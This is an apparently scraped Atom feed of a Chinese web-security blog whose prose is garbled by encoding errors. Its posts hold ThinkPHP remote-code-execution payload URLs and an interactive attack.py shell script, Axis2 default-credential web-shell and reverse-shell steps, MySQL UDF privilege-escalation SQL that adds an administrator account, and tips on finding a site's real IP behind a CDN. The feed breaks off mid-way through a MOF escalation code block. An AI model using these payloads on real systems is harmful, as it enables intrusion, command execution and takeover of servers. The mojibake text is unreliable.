<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>SuNu11&#39;Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://sunu11.com/"/>
  <updated>2018-12-26T03:04:58.619Z</updated>
  <id>http://sunu11.com/</id>
  
  <author>
    <name>SuNu11</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ä»thinkphpè¿œç¨‹ä»£ç æ‰§è¡Œå¼€å§‹</title>
    <link href="http://sunu11.com/2018/12/12/24/"/>
    <id>http://sunu11.com/2018/12/12/24/</id>
    <published>2018-12-12T12:58:44.000Z</published>
    <updated>2018-12-26T03:04:58.619Z</updated>
    
    <content type="html"><![CDATA[<p>9å·æ™šä¸Šthinkphpå®˜ç½‘å‘å¸ƒå®‰å…¨æ›´æ–°:<a href="https://blog.thinkphp.cn/869075" target="_blank" rel="external">https://blog.thinkphp.cn/869075</a><br>ä¿®å¤äº†ä¸€å¤„ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå½±å“æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„5.0 â€“ V5.0.23ç‰ˆæœ¬ä¸5.1 â€“ V5.1.31ç‰ˆæœ¬thinkphp å¼€å‘ç«™ç‚¹ã€‚ï¼Œç®€å•è®°å½•ä¸€ä¸‹è¿‘ä¸¤å¤©ä¸€äº›ä¿¡æ¯ä¸å¿ƒå¾—ã€‚<a id="more"></a></p><h3 id="thinkphpä»£ç æ‰§è¡Œæ¼æ´"><a href="#thinkphpä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="thinkphpä»£ç æ‰§è¡Œæ¼æ´"></a>thinkphpä»£ç æ‰§è¡Œæ¼æ´</h3><h4 id="ç®€è¿°"><a href="#ç®€è¿°" class="headerlink" title="ç®€è¿°"></a>ç®€è¿°</h4><p>åˆ°ç°åœ¨è¿™ä¸ªç‚¹ç›¸ä¿¡å„å¤§å‚å•†éƒ½çš„waféƒ½å¯ä»¥æ‹¦æˆªè¿™ä¸ªæ”»å‡»äº†ï¼ŒåŒ…æ‹¬æˆ‘å¸23333ã€‚ä¹‹æ‰€ä»¥å­˜åœ¨æ¼æ´ï¼Œå…³é”®åœ¨äºæ¡†æ¶å¯¹æ§åˆ¶å™¨åæ²¡æœ‰è¿›è¡Œè¶³å¤Ÿçš„æ£€æµ‹ï¼Œä»è¡¥ä¸ä¹Ÿèƒ½çœ‹å‡ºæ¥ã€‚<br>è´´æ¼æ´äº§ç”Ÿçš„éƒ¨åˆ†å…³é”®ä»£ç ï¼š<br>ä»ä¸‹è¿°ä»£ç å¯çŸ¥ï¼Œåœ¨å½“$nameåŒ…å«\åˆ™å°†å…¶ä½œä¸ºç±»åï¼Œå¦‚æœ$nameå¯æ§ï¼Œæ˜¯å¯ä»¥å®ä¾‹åŒ–ä»»ä½•ä¸€ä¸ªç±»çš„ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">protected function parseModuleAndClass($name, $layer, $appendSuffix)</div><div class="line">   &#123;   echo &apos;parseModuleAndClass:&apos;.$name.&quot;&lt;br&gt;&quot;;</div><div class="line">       if (false !== strpos($name, &apos;\\&apos;)) &#123; </div><div class="line">           $class  = $name;</div><div class="line"></div><div class="line">           $module = $this-&gt;request-&gt;module();</div><div class="line">       &#125;</div></pre></td></tr></table></figure><p>è€Œ$nameå¯æ§ä¸”\æ²¡è¢«è¿‡æ»¤ï¼Œå› æ­¤å¯ä»¥é€šè¿‡s=index/\think\Container/invokefunctionçš„æ–¹å¼è°ƒç”¨think\Containerè¿™ä¸ªå‘½åç©ºé—´ä¸‹çš„invokefunctionå‡½æ•°ã€‚ä»è€Œå®ç°å‘½ä»¤æ‰§è¡Œã€‚</p><h4 id="pocï¼š"><a href="#pocï¼š" class="headerlink" title="pocï¼š"></a><em>poc</em>ï¼š</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</div><div class="line">?s=index/\think\Request/input&amp;filter=system&amp;data=id</div><div class="line">?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</div><div class="line">?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E</div><div class="line">?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</div><div class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</div><div class="line">?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</div><div class="line">?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</div><div class="line">?s=index/think\config/get&amp;name=database.password</div></pre></td></tr></table></figure><h4 id="æ£€æµ‹è„šæœ¬ï¼š"><a href="#æ£€æµ‹è„šæœ¬ï¼š" class="headerlink" title="æ£€æµ‹è„šæœ¬ï¼š"></a>æ£€æµ‹è„šæœ¬ï¼š</h4><p>é¿å…å…¶ä»–é—®é¢˜ï¼Œæš‚æ”¾ä¸€ä¸ªgithubä¸Šçš„ç®€å•æµ‹è¯•è„šæœ¬ï¼šattack.py<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">#author: ctudoudou</div><div class="line">from requests import get</div><div class="line">from argparse import ArgumentParser</div><div class="line"></div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    parser = ArgumentParser(prog=&apos;Test poc&apos;, usage=&apos;./attack.py [options: -u] &lt;url&gt;&apos;,</div><div class="line">                            description=&quot;The ThinkPHP test script&quot;)</div><div class="line"></div><div class="line">    parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, dest=&quot;url&quot;, help=&quot;attack url&quot;)</div><div class="line"></div><div class="line">    args = parser.parse_args()</div><div class="line"></div><div class="line">    while (True):</div><div class="line">        url = &apos;&#123;&#125;?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&apos; \</div><div class="line">              &apos;&amp;vars[0]=system&amp;vars[1][]=&apos;.format(args.url)#å¯ç»§ç»­æ·»åŠ å…¶ä»–poc</div><div class="line">        command = input(&quot;shell$ &quot;)</div><div class="line">        if command != &quot;exit&quot;:</div><div class="line">            payload = url + str(command)</div><div class="line">            r = get(payload)</div><div class="line">            print(r.text)</div><div class="line">        else:</div><div class="line">            break</div></pre></td></tr></table></figure></p><p>è‡ªå·±ç®€å•å†™äº†ä¸€ä¸ªç»¼åˆæ£€æµ‹çš„è„šæœ¬ï¼š<br>github: <a href="https://github.com/sunu11/thinkphpv5" target="_blank" rel="external">https://github.com/sunu11/thinkphpv5</a></p><h4 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h4><p>å®˜æ–¹ç°å·²æ¨å‡ºè¡¥ä¸ å»ºè®®å¼€å‘è€…è¿›è¡Œä¿®å¤<br>Thinkphp v5.0.xè¡¥ä¸åœ°å€: <a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f" target="_blank" rel="external">https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f</a><br>Thinkphp v5.1.xè¡¥ä¸åœ°å€: <a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815" target="_blank" rel="external">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a><br>å¦å¤–åƒè¿™ç§æ¼æ´æ˜¯å­˜åœ¨æ”»å‡»ç‰¹å¾çš„ï¼ŒåŸºäºæ­£åˆ™çš„wafä¹Ÿå¯ä»¥è¿›è¡Œæ‹¦æˆªï¼Œå› æ­¤æœ‰è£…äº†wafçš„å‡çº§è§„åˆ™åº“å¯ä¿æ— ç¢ï¼Œæ²¡å®‰è£…çš„git pull å®˜æ–¹ä»£ç åº”è¯¥ä¹Ÿè¿˜okã€‚å…³é”®æ˜¯åŠæ—¶å‘ç°ï¼ŒåŠæ—¶å¤„ç†ã€‚</p><h3 id="å…¶ä»–æ¼æ´"><a href="#å…¶ä»–æ¼æ´" class="headerlink" title="å…¶ä»–æ¼æ´"></a>å…¶ä»–æ¼æ´</h3><p>1ã€phpmyadmin å®˜ç½‘ä¹Ÿæ›´æ–°äº†ï¼Œä¿®å¤äº†ä¸‰æšæ¼æ´ï¼Œæ–‡ä»¶åŒ…å«ã€csrfã€xssï¼Œå¯ä»¥åŠæ—¶å…³æ³¨ä¸€ä¸‹ã€‚<a href="https://www.t00ls.net/articles-48952.html" target="_blank" rel="external">https://www.t00ls.net/articles-48952.html</a><br>2ã€å¶åƒOrange Tsaiå‘äº†ä¸€æ¡Twitterï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">After weeks of diving into a single 500mb idb file. Finally chained a pre-auth RCE in a popular SSL VPN! ğŸ™Œ</div></pre></td></tr></table></figure></p><p>é™å€™233333</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;9å·æ™šä¸Šthinkphpå®˜ç½‘å‘å¸ƒå®‰å…¨æ›´æ–°:&lt;a href=&quot;https://blog.thinkphp.cn/869075&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://blog.thinkphp.cn/869075&lt;/a&gt;&lt;br&gt;ä¿®å¤äº†ä¸€å¤„ä»£ç æ‰§è¡Œæ¼æ´ï¼Œå½±å“æ²¡æœ‰å¼€å¯å¼ºåˆ¶è·¯ç”±çš„5.0 â€“ V5.0.23ç‰ˆæœ¬ä¸5.1 â€“ V5.1.31ç‰ˆæœ¬thinkphp å¼€å‘ç«™ç‚¹ã€‚ï¼Œç®€å•è®°å½•ä¸€ä¸‹è¿‘ä¸¤å¤©ä¸€äº›ä¿¡æ¯ä¸å¿ƒå¾—ã€‚
    
    </summary>
    
      <category term="WEBå®‰å…¨" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="getshell" scheme="http://sunu11.com/tags/getshell/"/>
    
      <category term="phpmyadmin" scheme="http://sunu11.com/tags/phpmyadmin/"/>
    
      <category term="thinkphp" scheme="http://sunu11.com/tags/thinkphp/"/>
    
  </entry>
  
  <entry>
    <title>å…¶ä»–åˆ†äº«çš„ä¸€äº›ä¸œè¥¿</title>
    <link href="http://sunu11.com/2018/11/28/ohters/"/>
    <id>http://sunu11.com/2018/11/28/ohters/</id>
    <published>2018-11-28T05:32:38.000Z</published>
    <updated>2018-12-26T02:52:52.532Z</updated>
    
    <content type="html"><![CDATA[<p>è®°å½•ä¸€ä¸‹ï¼Œæ–¹ä¾¿ä»¥åæŸ¥è¯¢ã€‚<a id="more"></a></p><h3 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><p>ucms1.4.5åå°sqlæ³¨å…¥æ¼æ´ <a href="https://www.t00ls.net/thread-48432-1-1.html" target="_blank" rel="external">https://www.t00ls.net/thread-48432-1-1.html</a><br>DedeCMS V5.7 SP2å‰å°æ–‡ä»¶ä¸Šä¼ (éœ€è¦åå°æƒé™CVE-2018-20129)å¤ç°åˆ†æ <a href="https://www.t00ls.net/thread-49086-1-1.html" target="_blank" rel="external">https://www.t00ls.net/thread-49086-1-1.html</a></p><h3 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h3><p>H1 CTF Writeup(ç®€å•ç¿»è¯‘ï¼‰<a href="https://www.t00ls.net/thread-48659-1-1.html" target="_blank" rel="external">https://www.t00ls.net/thread-48659-1-1.html</a><br>ç½‘é¼æ¯éƒ¨åˆ†é¢˜writeup <a href="https://topsec.wiki/36t9aJda/?thread-495.htm" target="_blank" rel="external">https://topsec.wiki/36t9aJda/?thread-495.htm</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;è®°å½•ä¸€ä¸‹ï¼Œæ–¹ä¾¿ä»¥åæŸ¥è¯¢ã€‚
    
    </summary>
    
      <category term="WEBå®‰å…¨" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Axis2æ¶æ„éƒ¨ç½²getshell</title>
    <link href="http://sunu11.com/2018/11/03/Axis2%E6%81%B6%E6%84%8F%E9%83%A8%E7%BD%B2getshell/"/>
    <id>http://sunu11.com/2018/11/03/Axis2æ¶æ„éƒ¨ç½²getshell/</id>
    <published>2018-11-03T13:42:06.000Z</published>
    <updated>2018-11-10T12:11:18.078Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>ä»¥å‰é‡åˆ°çš„ï¼Œè®°å½•ä¸€ä¸‹ï¼Œä¾¿äºä»¥åæŸ¥é˜… <a id="more"></a></p><h3 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h3><p>ä¸€èˆ¬é»˜è®¤çš„è´¦å·æ˜¯adminå¯†ç æ˜¯axis2ï¼Œç™»é™†åï¼šç‚¹å‡»upload service<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-1.png" alt="1"><br>ä¸Šä¼ cat.aaræ–‡ä»¶ï¼Œå¯çœ‹åˆ°ä¸Šä¼ æˆåŠŸã€‚<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-2.png" alt="2"><br>ç‚¹å‡»Available Serviceså¯é€‰æ‹©å¯ç”¨çš„åŠŸèƒ½ã€‚<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-3.png" alt="3"><br>ä¸»è¦åŠŸèƒ½æœ‰ï¼š<br>1ã€getClassPath<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-4.png" alt="4"><br>2ã€æ‰§è¡Œå‘½ä»¤ï¼š<br>å‚æ•°:<br><code>cmd=xxx</code><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-5.png" alt="5"><br>3ã€åå¼¹shellï¼š<br><code>https://192.168.86.254:8443/axis2/services/Cat/shell?host=x.x.x.x&amp;port=x</code><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/axis2-6.png" alt="6"><br>4ã€å†™å…¥shellæˆ–æ˜¯å†™å…¥æ–‡ä»¶<br><code>https://192.168.86.254:8443/axis2/services/Cat/writeStringToFile?data=æ•°æ®&amp;file=æ–‡ä»¶è·¯å¾„&amp;encoding=utf-8&amp;append=false</code></p><p>è¯¦ç»†è¿‡ç¨‹è¯·å‚è€ƒï¼š<a href="http://p2j.cn/?p=1533" target="_blank" rel="external">http://p2j.cn/?p=1533</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h3&gt;&lt;p&gt;ä»¥å‰é‡åˆ°çš„ï¼Œè®°å½•ä¸€ä¸‹ï¼Œä¾¿äºä»¥åæŸ¥é˜…
    
    </summary>
    
      <category term="æ¸—é€æµ‹è¯•" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="getshell" scheme="http://sunu11.com/tags/getshell/"/>
    
      <category term="axis2" scheme="http://sunu11.com/tags/axis2/"/>
    
      <category term="ä¸­é—´ä»¶" scheme="http://sunu11.com/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>å¦‚æœè·å–ç«™ç‚¹çœŸå®ip</title>
    <link href="http://sunu11.com/2018/11/03/%E5%A6%82%E6%9E%9C%E8%8E%B7%E5%8F%96%E7%AB%99%E7%82%B9%E7%9C%9F%E5%AE%9Eip/"/>
    <id>http://sunu11.com/2018/11/03/å¦‚æœè·å–ç«™ç‚¹çœŸå®ip/</id>
    <published>2018-11-03T13:16:00.000Z</published>
    <updated>2018-11-10T12:09:27.909Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>è¯´åˆ°æ¸—é€æµ‹è¯•ï¼Œè‚¯å®šæœ‰ä¿¡æ¯æ”¶é›†ï¼›ä¿¡æ¯æ”¶é›†å°±æ¶‰åŠæœåŠ¡å™¨ipä¿¡æ¯ã€‚è€Œé€šå¸¸å¤§å‹ç«™ç‚¹éƒ½é€šè¿‡äº†cdnã€ä»£ç†ç­‰æ‰‹æ®µéšè—ã€‚æœ¬æ–‡å¯¹è¿™ä¸ªè€è¯é¢˜ä½œä¸€ä¸‹ä¸ªäººçš„æ€è·¯ä»¥åŠå§¿åŠ¿æ€»ç»“ã€‚<a id="more"></a></p><h2 id="å§¿åŠ¿"><a href="#å§¿åŠ¿" class="headerlink" title="å§¿åŠ¿"></a>å§¿åŠ¿</h2><p>1ã€å¯¹äºå­˜åœ¨æ³¨å†Œæˆ–è€…ç•™è¨€ç­‰èƒ½å¤Ÿè®©ç«™ç‚¹é€šè¿‡é‚®ä»¶è”ç³»çš„ç½‘ç«™ï¼Œé€šå¸¸å¯ä»¥é€šè¿‡ç«™ç‚¹å‘é€çš„é‚®ä»¶æ‰¾åˆ°æœåŠ¡å™¨çš„çœŸå®ipï¼Œå¦‚bilibili.comï¼š<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/getip-1.png" alt="1"><br>æ­¤æ–¹æ³•æ˜¯å› ä¸ºé€šå¸¸å¤§éƒ¨åˆ†å…¬ç”¨SMTPæœåŠ¡åœ¨å‘ä¿¡æ—¶é‚®ä»¶å¤´ä¼šå¸¦ä¸Šå‘ä»¶è€…ipï¼Œcdnçš„é˜²æŠ¤å¯¹è¿™ç§æ–¹å¼å®Œå…¨æ²¡ä½œç”¨ã€‚è§£å†³æ–¹å¼å¯ä»¥å‚è€ƒæ­¤é“¾æ¥ï¼š<a href="https://www.v2ex.com/t/276788" target="_blank" rel="external">https://www.v2ex.com/t/276788</a><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/getip-2.png" alt="2"><br>2ã€nslookupå‘½ä»¤ï¼šå¯¹äºbilibili.com è¯¥æ–¹å¼åŒæ ·å®ç”¨ï¼Œå› ä¸ºå­˜åœ¨MXè®°å½•ï¼š<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/getip-3.png" alt="3"><br>ä¹Ÿå¯ä»¥æŸ¥æ‰¾NSã€TXTç­‰å…¶ä»–è®°å½•è¿›è¡ŒçœŸå®ipçš„æŸ¥æ‰¾ã€‚å¦å¤–è¿˜å¯ä»¥ä½¿ç”¨å›½å¤–å†·é—¨çš„dnsè§£æåŸŸåï¼šnslookup xxx.com y.y.y.y  å¦‚æœè¿æ°”å¥½ï¼Œæ‰¾åˆ°ç›´æ¥è§£æåˆ°æœåŠ¡å™¨çœŸå®ipçš„dnsæœåŠ¡å™¨ã€‚ä¸€æŸ¥å°±å‡ºæ¥äº†ã€‚<br>3ã€Pingï¼šæ‰¾äºŒçº§åŸŸåï¼Œé€šè¿‡pingå°†ç½‘ç«™çš„äºŒçº§åŸŸåçš„ipé€ä¸ªä¸ç›®æ ‡åŸŸåç›¸åŒ¹é…ï¼Œç›´åˆ°è®¿é—®æˆåŠŸå³å¯ï¼Œè¿˜æœ‰pingç§ƒåŸŸå(å¦‚å¯¹äºwww.baidu.comï¼Œå¯¹äºping baidu.comå°±æ˜¯pingç§ƒåŸŸå)ï¼Œè¿™ç±»æ–¹å¼éƒ½æ˜¯çœ‹ç®¡ç†å‘˜ç²—ä¸ç²—å¿ƒï¼Œå¦‚æœèƒ½æ‰¾åˆ°ç®¡ç†å‘˜æ²¡æœ‰ä½¿ç”¨cdnçš„åŸŸåï¼Œå°±èƒ½æ‰¾åˆ°çœŸå®ipäº†ã€‚åŒæ ·å› ä¸ºå¾ˆå¤šå›½å†…çš„CDNæ²¡æœ‰èŠ‚ç‚¹å¯¹å›½å¤–æœåŠ¡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å›½å¤–çš„å¤šèŠ‚ç‚¹pingå·¥å…·ï¼Œä¾‹å¦‚just-pingï¼Œå…¨ä¸–ç•Œå‡ åä¸ªèŠ‚ç‚¹pingç›®æ ‡åŸŸåï¼Œå¾ˆæœ‰å¯èƒ½æ‰¾åˆ°çœŸå®ipã€‚åŸŸåï¼š<a href="https://asm.ca.com/en/ping.php" target="_blank" rel="external">https://asm.ca.com/en/ping.php</a><br>4ã€é€šè¿‡ç½‘ç«™çš„ç¼ºé™·ä¸æ¼æ´,æ¯”å¦‚å¯»æ‰¾ç½‘ç«™ä¸Šçš„æ¢é’ˆï¼šphpinfoç­‰ï¼Œå¯»æ‰¾ç½‘ç«™ä¸Šçš„xssã€os injectionã€ssrfç­‰ä¸€åˆ‡å¯ä»¥è®©æœåŠ¡å™¨ä¸»åŠ¨è®¿é—®æˆ‘çš„vpsçš„æ¼æ´ï¼Œå¹¶æˆåŠŸåˆ©ç”¨ã€‚é€šè¿‡æŸ¥çœ‹æ—¥å¿—æˆ–è€…vpsçš„è¯·æ±‚è®°å½•å°±èƒ½çœ‹åˆ°çœŸå®ipã€‚<br>5ã€é€šè¿‡å¤§é‡ä¿¡æ¯æ”¶é›†ï¼Œå¦‚é€šè¿‡å…¶ä»–ç¬¬ä¸‰æ–¹ç½‘ç«™æŸ¥çœ‹åŸŸåå†å²è§£æè®°å½•ã€åŸŸåå†å²ä¿¡æ¯å†å²æ¼æ´æˆ–è€…äºŒçº§åŸŸåç­‰ç„¶ååˆ©ç”¨è¿™äº›è·å–åˆ°çš„ä¿¡æ¯è¿›è¡Œè¿›ä¸€æ­¥çš„ipæŸ¥æ‰¾ï¼ˆçµæ´»ä½¿ç”¨ï¼‰ï¼Œè¿™ä¸‹é¢æ˜¯å¸¸ç”¨çš„å‡ ä¸ªï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">https://bgp.he.net </div><div class="line">https://toolbar.netcraft.com/site_report?url=www.xxx.com</div><div class="line">http://www.17ce.com</div><div class="line">http://www.crimeflare.com/</div><div class="line">https://domainbigdata.com/goodmbi.com</div><div class="line">https://crt.sh/</div><div class="line">http://wooyun.jozxing.cc/</div><div class="line">https://fofa.so/</div></pre></td></tr></table></figure><p>æœ€åçš„fofaæ˜¯ç½‘ä¸Šå­¦åˆ°çš„å§¿åŠ¿ä¹‹ä¸€ï¼Œé€šè¿‡fofaçš„HTMLæºä»£ç æ£€ç´¢ï¼Œå¤åˆ¶ç½‘é¡µtitleæˆ–è€…å…¶ä»–ä¿¡æ¯æ”¾fofaè¿›è¡Œæ£€ç´¢ï¼Œ5173.comå¯ä»¥é€šè¿‡è¯¥æ–¹æ³•æ‰¾åˆ°çœŸå®ipä½†æ˜¯å‰ä¸¤å¤©æˆ‘éœ€è¦æŸ¥æ‰¾æºipçš„ç½‘å€ä½¿ç”¨è¯¥æ–¹æ³•æ— æ•ˆï¼Œæ­¤æ–¹æ³•å»ºç«‹åœ¨é€šè¿‡fofaèƒ½æ£€ç´¢åˆ°å¹¶ä¸”htmlæ ‡è¯†å¤Ÿç‹¬ç‰¹çš„åŸºç¡€ä¸‹ï¼Œä¸ªäººæ„Ÿè§‰åœ¨æ²¡æœ‰æ€è·¯çš„æ—¶å€™ä¹Ÿå¯ä»¥è¯•è¯•ï¼Œæœ‰å¾…ä¸‹ä¸€æ¬¡å®è·µã€‚è´´ä¸€å¼ å›¾ï¼š<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/getip-4.png" alt="4"><br>6ã€å…¶ä»–æ²¡å°è¯•è¿‡çš„å§¿åŠ¿ï¼šç¤¾å·¥åˆ°cdnè´¦å·å¯†ç ï¼Œæ€¼è¿›å»çœ‹é…ç½®ï¼›zmapæ‰«å…¨ç½‘ï¼ŒåŒ¹é…ç«™ç‚¹ä¿¡æ¯è¿½æº¯çœŸå®ipï¼›DDOSï¼ŒæŠŠcdnæ‰“ç©¿å°±ä¼šå›æºï¼›é€šè¿‡DNSç¤¾å·¥åº“ï¼Œæ‰¾å¯¹åº”çš„è§£æè®°å½•ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ç®€ä»‹&quot;&gt;&lt;a href=&quot;#ç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ç®€ä»‹&quot;&gt;&lt;/a&gt;ç®€ä»‹&lt;/h2&gt;&lt;p&gt;è¯´åˆ°æ¸—é€æµ‹è¯•ï¼Œè‚¯å®šæœ‰ä¿¡æ¯æ”¶é›†ï¼›ä¿¡æ¯æ”¶é›†å°±æ¶‰åŠæœåŠ¡å™¨ipä¿¡æ¯ã€‚è€Œé€šå¸¸å¤§å‹ç«™ç‚¹éƒ½é€šè¿‡äº†cdnã€ä»£ç†ç­‰æ‰‹æ®µéšè—ã€‚æœ¬æ–‡å¯¹è¿™ä¸ªè€è¯é¢˜ä½œä¸€ä¸‹ä¸ªäººçš„æ€è·¯ä»¥åŠå§¿åŠ¿æ€»ç»“ã€‚
    
    </summary>
    
      <category term="æ¸—é€æµ‹è¯•" scheme="http://sunu11.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="ä¿¡æ¯æ”¶é›†" scheme="http://sunu11.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
      <category term="fofa" scheme="http://sunu11.com/tags/fofa/"/>
    
  </entry>
  
  <entry>
    <title>mysqlä¸¤ç§ç»å…¸ææƒæ–¹å¼</title>
    <link href="http://sunu11.com/2018/11/03/%E7%BB%8F%E5%85%B8%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E8%AE%B0%E5%BD%95/"/>
    <id>http://sunu11.com/2018/11/03/ç»å…¸ææƒæ–¹å¼è®°å½•/</id>
    <published>2018-11-03T11:47:30.000Z</published>
    <updated>2018-11-10T12:12:10.757Z</updated>
    
    <content type="html"><![CDATA[<h3 id="udfææƒ"><a href="#udfææƒ" class="headerlink" title="udfææƒ"></a>udfææƒ</h3><p>æ¡ä»¶ï¼š<br>1ã€ç³»ç»Ÿç‰ˆæœ¬ï¼ˆWindows2000ï¼ŒXP,Win2003);<br>2ã€æ‹¥æœ‰MYSQLçš„æŸä¸ªè´¦å·ï¼Œä¸”è¯¥è´¦å·å…·æœ‰å¯¹msqlçš„insertä¸deleteæƒé™ã€‚<br>3ã€å…·æœ‰rootè´¦å·å¯†ç <a id="more"></a><br>é¦–å…ˆå¯¼å‡ºudfï¼š<br>MYSQL5.1ä»¥ä¸Šç‰ˆæœ¬ï¼Œéœ€è¦æŠŠudf.dllæ–‡ä»¶å­˜æ”¾åˆ°MSYSQLå®‰è£…ç›®å½•ä¸‹çš„lib\pluginæ–‡ä»¶å¤¹ä¸‹ã€‚<br>åœ¨mysqlå‘½ä»¤è¡Œè¾“å…¥ï¼š<br><figure class="highlight plain"><figcaption><span>@@basedir</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">show variables like &apos;%plugins%&apos;</div></pre></td></tr></table></figure></p><p>ç„¶åææƒï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">create function cmdshell returns string soname &apos;udf.dll&apos;</div><div class="line">select cmdshell(&apos;net user xxx xxx /add&apos;);</div><div class="line">select cmdshell (&apos;net localgroup administrators xxx /add&apos;);</div><div class="line"></div><div class="line">drop function cmdshell;</div></pre></td></tr></table></figure></p><p>**<code>returns string soname â€˜å¯¼å‡ºçš„DLLè·¯å¾„â€™</code></p><h3 id="mofææƒ"><a href="#mofææƒ" class="headerlink" title="mofææƒ"></a>mofææƒ</h3><p>ä»¥ä¸‹ä¸ºåˆ›å»ºxxxç”¨æˆ·çš„mofæ–‡ä»¶ï¼Œä½¿ç”¨sqlæ‰§è¡Œload_fileåŠinto dumpfile æŠŠæ–‡ä»¶å¯¼å‡ºåˆ°æ­£ç¡®ä½ç½®ï¼Œæ‰§è¡Œå³å¯ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div 